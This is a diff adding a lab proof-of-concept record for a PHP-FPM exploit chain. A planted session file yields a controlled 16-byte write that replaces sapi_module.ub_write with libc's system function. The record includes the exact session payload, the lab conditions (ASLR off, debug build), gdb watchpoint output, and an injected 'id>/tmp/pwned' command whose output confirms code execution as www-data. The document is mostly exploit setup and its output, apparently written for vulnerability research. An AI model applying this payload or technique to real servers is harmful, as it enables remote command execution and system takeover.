@@ -1,0 +1,61 @@
+FPM chain E: controlled 16-byte write to sapi_module.ub_write and command execution
+Lab: phpdebug:8.4.26-fpm (PHP 8.4.26, -O1 -g3, --enable-fpm), nginx, one worker,
+ASLR off, memory_limit=32M, display_errors=On.
+Planted session: /tmp/sessions/sess_consumerpoc0000000000000002 = "C|i:140737337819280;AAAA" (24 bytes).
+Addresses are from this lab boot only. Sanitized: no host names or infrastructure.
+gdb: hardware watchpoint on *(long long*)&sapi_module.ub_write; breakpoint on system with x/s $rdi.
+
+$ gdb -p <worker> -x pocQ.gdb
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007ffff70ac3a7 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+warning: File "/usr/local/sbin/php-fpm" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /usr/local/sbin/php-fpm
+line to your configuration file "/root/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/root/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x7ffff7070090
+Hardware watchpoint 2: *(long long*)0x555556ae2dd0
+WATCH_ub_write: val=0x7ffff7070090 pc=0x555555931f7e
+SYSTEM rdi=0x7ffff6202040 str=[X-Powered-By: PHP/8.4.26]
+[Detaching after vfork from child process 2727]
+SYSTEM rdi=0x555555c0534a str=[
+]
+[Detaching after vfork from child process 2728]
+SYSTEM rdi=0x7ffff6256230 str=[Content-type: text/html; charset=UTF-8]
+[Detaching after vfork from child process 2729]
+SYSTEM rdi=0x555555c0534a str=[
+]
+[Detaching after vfork from child process 2730]
+SYSTEM rdi=0x555555c0534a str=[
+]
+[Detaching after vfork from child process 2731]
+SYSTEM rdi=0x7ffff6260500 str=[<br />
+<b>Warning</b>:  PHP Request Startup: Failed to decode session object. Session has ]
+[Detaching after vfork from child process 2732]
+SYSTEM rdi=0x7ffff6260500 str=[<br />
+<b>Warning</b>:  PHP Request Startup: Failed to write session data (files). Please ]
+[Detaching after vfork from child process 2733]
+SYSTEM rdi=0x7ffff6260400 str=[<br />
+<b>Warning</b>:  PHP Request Startup: Session cookie cannot be sent after headers h]
+[Detaching after vfork from child process 2734]
+SYSTEM rdi=0x7ffff6260400 str=[<br />
+<b>Warning</b>:  PHP Request Startup: Failed to write session data (files). Please ]
+[Detaching after vfork from child process 2735]
+SYSTEM rdi=0x7ffff6266078 str=[read=foo;id>/tmp/pwned
+]
+[Detaching after vfork from child process 2736]
+[Inferior 1 (process 2680) detached]
+
+The 16-byte write {0x7ffff7070090, IS_LONG} landed on sapi_module.ub_write (0x555556ae2dd0,
+mod 16 = 0). The value 0x7ffff7070090 is the libc system entry in this lab boot. The first eight
+system calls are the response headers and the session warnings; the ninth is the attacker chunk
+from the script echo. system ignores the second argument (length).
+
+$ cat /tmp/pwned
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
